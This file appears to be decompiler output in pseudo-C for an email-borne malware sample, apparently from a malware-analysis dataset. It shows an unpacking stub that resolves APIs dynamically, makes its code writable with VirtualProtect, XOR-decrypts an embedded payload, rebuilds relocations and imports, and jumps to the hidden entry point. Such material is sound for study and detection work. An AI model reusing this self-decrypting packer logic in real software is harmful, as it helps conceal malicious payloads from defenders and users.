// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0446/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 eax, word32 ecx, word32 edx, word32 ebx)
{
fn00401000_entry:
l00401000:
	SHLWAPI.dll!StrChrA()
	Eq_3 * esi_100 = null
	branch eax == 0x00000000 l0040101D
l00401016:
	return
l0040101D:
	code * eax_39 = GetProcAddress(LoadLibraryA(0x00404074), 0x0040406C)
	eax_39()
	word32 edi_335 = eax_39 + 0x0000001C
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040105C
l00401059:
	edi_335 = eax_39 + 0x0000001C ^ 0x0000000E
l0040105C:
	fp->dwFFFFFFC4 = fp - 0x00000028;
	fp->dwFFFFFFC4 = 0x00000040;
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	Eq_53 * eax_134 = null
l00401078:
	branch esi_100 != edi_335 l0040107E
l0040107C:
	esi_100 = null;
l0040107E:
	eax_134->b402618 = esi_100->b405000 ^ eax_134->b402618 ^ 0xFE;
	Eq_3 * esi_103 = esi_100 + 1
	branch esi_103 != edi_335 l0040109C
l0040109A:
	esi_103 = null;
l0040109C:
	eax_134->b402619 = esi_103->b405000 ^ eax_134->b402619 ^ 0xFE;
	Eq_3 * esi_114 = esi_103 + 1
	branch esi_114 != edi_335 l004010BA
l004010B8:
	esi_114 = null;
l004010BA:
	eax_134->b40261A = esi_114->b405000 ^ eax_134->b40261A ^ 0xFE;
	Eq_3 * esi_124 = esi_114 + 1
	branch esi_124 != edi_335 l004010D8
l004010D6:
	esi_124 = null;
l004010D8:
	eax_134 = eax_134 + 1;
	eax_134->b402617 = esi_124->b405000 ^ eax_134->b40261B ^ 0xFE;
	esi_100 = esi_124 + 1;
	branch eax_134 <u (Eq_53 *) 0x00001420 l00401078
l004010FE:
	Eq_129 * edi_142 = &globals->t4038F8
	up32 ebx_144 = 0x00000000
	up32 dwLoc24_148 = 0x00000000
l00401120:
	word32 eax_156 = edi_142->dw0004
	Eq_151 * ecx_162 = &edi_142->t0008
	branch eax_156 - 0x00000008 >>u 0x00000001 <= 0x00000000 l0040115B
l0040112F:
	uint32 esi_297 = eax_156 - 0x00000008 >>u 0x00000001
l00401131:
	branch (ecx_162->w0000 & 0xF000) != 0x3000 l0040114F
l0040113E:
	Eq_158 * eax_318 = ((word32) ecx_162->w0000 & 0x00000FFF) + edi_142->dw0000
	eax_318->dw402398 = eax_318->dw402398 + 0xF0402398;
l0040114F:
	ecx_162 = ecx_162 + 1;
	esi_297 = esi_297 - 0x00000001;
	branch esi_297 != 0x00000000 l00401131
l00401157:
	ebx_144 = dwLoc24_148;
l0040115B:
	ebx_144 = ebx_144 + edi_142->dw0004;
	dwLoc24_148 = ebx_144;
	edi_142 = edi_142 + Mem137[edi_142 + 0x00000004:word32];
	branch ebx_144 <u 0x000000E4 l00401120
l00401170:
	Eq_185 * ebx_177 = &globals->t4030F4
	Eq_185 * dwLoc20_178 = &globals->t4030F4
	ebx_202 = ebx_177;
	branch globals->dw403104 == 0x00000000 l004011F5
l00401183:
	Eq_185 * ebx_202
	Eq_11 eax_210 = LoadLibraryA(ebx_202->dw000C + 0x00402398)
	branch eax_210 == 0x00000000 l004011E8
l00401197:
	word32 edi_236 = ebx_202->dw0000
	branch edi_236 != 0x00000000 l004011A0
l0040119D:
	edi_236 = ebx_202->dw0010;
l004011A0:
	Eq_226 * edi_241 = edi_236 + 0x00402398
	Eq_229 * esi_245 = ebx_202->dw0010 + 0x00402398
	branch edi_241->dw0000 == 0x00000000 l004011E8
l004011AF:
l004011B0:
	Eq_12 dwLoc3C_271
	Eq_11 dwLoc40_266
	int32 eax_261 = edi_241->dw0000
	word16 ax_262 = (word16) eax_261
	branch eax_261 >= 0x00000000 l004011C4
l004011B9:
	dwLoc3C_271 = (word32) ax_262;
	dwLoc40_266 = eax_210;
	goto l004011CE
l004011C4:
	dwLoc3C_271 = eax_261 + 0x0040239A;
	dwLoc40_266 = eax_210;
l004011CE:
	esi_245->ptr0000 = GetProcAddress(dwLoc40_266, dwLoc3C_271);
	edi_241 = edi_241 + 1;
	esi_245 = esi_245 + 1;
	branch edi_241->dw0000 != 0x00000000 l004011B0
l004011E4:
	ebx_202 = dwLoc20_178;
l004011E8:
	ebx_202 = ebx_202 + 1;
	dwLoc20_178 = ebx_202;
	branch ebx_202->dw0010 != 0x00000000 l00401183
l004011F5:
	0x00402DE8()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

